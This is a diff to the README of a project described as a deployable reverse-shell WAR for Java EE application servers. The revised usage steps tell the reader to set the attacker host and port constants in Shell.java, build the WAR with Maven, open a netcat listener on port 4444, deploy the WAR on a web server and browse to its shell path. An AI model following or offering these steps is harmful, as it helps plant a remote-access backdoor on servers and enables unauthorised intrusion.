@@ -5,17 +5,11 @@ A war-ready reverse shell to deploy on Java EE application server
 
 ## usage
 
-1.
-`mvn clean install` to compile the war
-
-
-2. `nc -lvp 4444` for listening the connection
-
-
-3. deploy on the web serveur & go to <deploy_path>/shell
-
-
-4. enjoy your shell
+1. Go to src/main/java/com/manchabalais/reverse/java/Shell.java and change the 2 constants host & port
+2. Compile the war with `mvn clean install`
+3. `nc -lvp 4444` for listening the connection
+4. deploy on the web serveur & go to <deploy_path>/shell
+5. enjoy your shell
 
 ## Notes
 
